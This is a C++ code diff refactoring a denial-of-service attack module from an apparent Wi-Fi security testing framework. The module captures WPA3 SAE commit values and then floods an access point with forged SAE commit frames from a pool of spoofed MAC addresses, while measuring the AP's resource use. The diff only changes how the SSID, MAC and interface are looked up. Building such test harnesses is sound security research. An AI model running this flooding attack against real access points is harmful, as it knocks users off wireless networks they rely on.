@@ -7,6 +7,8 @@
 #include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
 #include "config/RunStatus.h"
 #include "ex_program/external_actors/ExternalConn.h"
+#include "ex_program/hostapd/hostapd.h"
+#include "ex_program/hostapd/hostapd_helper.h"
 #include "logger/log.h"
 #include "observer/resource_checker.h"
 #include "system/hw_capabilities.h"
@@ -45,13 +47,11 @@ void run_attack(RunStatus &rs){
 	const ActorPtr attacker = rs.get_actor("attacker");
 	const ActorPtr ap = rs.get_actor("access_point");
 
-	const auto ssid = rs.config().at("actors").at("access_point").at("setup").at("program_config").at("ssid").get<
-		string>();
-
 	// Capture real scalar+element via wpa_supplicant before switching to monitor
 	log(LogLevel::INFO, "Capturing SAE commit values...");
-	const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
-		rs, attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);
+	const optional<sae_helper::SAEPair> sae_params =
+		cookie_guzzler::get_commit_values(rs, attacker.get(SK::iface), attacker.get(SK::sniff_iface),
+			hostapd::get_ssid(rs, "access_point"), ap.get(SK::mac), 30);
 
 	if(!sae_params.has_value()) throw run_err("Failed to capture SAE commit values");
 
@@ -59,9 +59,6 @@ void run_attack(RunStatus &rs){
 	attacker->set_iface_up();
 
 	log(LogLevel::INFO, "Setup done, group_id=%u, scalar size={}", sae_params->group_id, sae_params->scalar.size());
-
-	const HWAddress<6> ap_mac(ap["mac"]);
-	const string iface = attacker["iface"];
 
 	const auto &att_cfg = rs.config().at("attack_config");
 	const int attack_time = att_cfg.at("attack_time_sec").get<int>();
@@ -75,7 +72,7 @@ void run_attack(RunStatus &rs){
 
 	const vector<HWAddress<6>> mac_pool = build_mac_pool(rs, pool_size, use_conn_stas);
 
-	PacketSender sender(iface);
+	PacketSender sender(attacker.get(SK::iface));
 	mt19937 rng(random_device{}());
 	uniform_int_distribution<size_t> group_dist(0, N_DH_GROUPS - 1);
 
@@ -88,7 +85,7 @@ void run_attack(RunStatus &rs){
 		const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
 		++mac_idx;
 		sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
-		return make_sae_commit(ap_mac, sta_mac, sae_params.value());
+		return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
 	});
 
 	ap->conn->disconnect();
@@ -102,7 +99,6 @@ void stats_attack(const RunStatus &rs){
 					{"access_point", "EAPOL-4WAY-HS-COMPLETED", "4Way", "green"},
 					{"client", START_tag, "START", "black"}, {"client", END_tag, "END", "black"},
 				});
-	const auto ap = rs.config().at("actors").at("access_point");
-	observer::resource_checker::create_graph(rs, ap["source"], elements);
+	observer::resource_checker::create_graph(rs, rs.get_actor("access_point").get(SK::source), elements);
 }
 }
